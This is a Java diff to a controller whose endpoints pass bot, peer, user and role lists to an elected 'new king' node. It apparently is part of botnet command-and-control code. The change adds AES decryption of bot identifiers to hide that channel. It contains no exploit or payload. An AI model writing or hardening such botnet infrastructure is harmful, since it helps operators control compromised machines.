@@ -108,10 +108,13 @@ public class CommandController {
 	@ResponseBody
 	public List<Role> newKingRoles(@RequestBody String idBot,HttpServletRequest req) {
 		System.out.println("Richiesta RUOLI del database da " + req.getRemoteAddr());
+		idBot=cmm.getCrypto().decryptAES(idBot);
+		
 		System.out.println("id b"+ idBot);
 		System.out.println("id b2"+ cmm.getpServ().getNewKing());
 		System.out.println("id b3"+ cmm.getpServ().getNewKing().equals(idBot));
 
+		
 		if (!cmm.getpServ().getNewKing().equals(idBot))
 			return null;
 		List<Role> response = new ArrayList<Role>();
@@ -126,6 +129,7 @@ public class CommandController {
 	@ResponseBody
 	public List<Bot> newKingBots(@RequestBody String idBot,HttpServletRequest req) {
 		System.out.println("Richiesta BOT del database da " + req.getRemoteAddr());
+		idBot=cmm.getCrypto().decryptAES(idBot);
 		List<Bot> response = new ArrayList<Bot>();
 		// Bot
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -139,6 +143,7 @@ public class CommandController {
 	@ResponseBody
 	public List<User> newKingUsers(@RequestBody String idBot,HttpServletRequest req) {
 		System.out.println("Richiesta USERS del database da " + req.getRemoteAddr());
+		idBot=cmm.getCrypto().decryptAES(idBot);
 		List<User> response = new ArrayList<User>();
 		// User
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -151,6 +156,7 @@ public class CommandController {
 	@ResponseBody
 	public List<String> newKingPeers(@RequestBody String idBot,HttpServletRequest req) {
 		System.out.println("Richiesta PEERS del database da " + req.getRemoteAddr());
+		idBot=cmm.getCrypto().decryptAES(idBot);
 		List<String> response = new ArrayList<String>();
 		// User
 		if (!cmm.getpServ().getNewKing().equals(idBot))
@@ -172,6 +178,7 @@ public class CommandController {
 	@ResponseBody
 	public boolean newKingReady(@RequestBody String idBot,HttpServletRequest req) {
 		System.out.println("Richiesta di conferma passaggio di poteri da" + req.getRemoteAddr());
+		idBot=cmm.getCrypto().decryptAES(idBot);
 		// avvisa dns
 		if (!cmm.getpServ().getNewKing().equals(idBot))
 			return false;
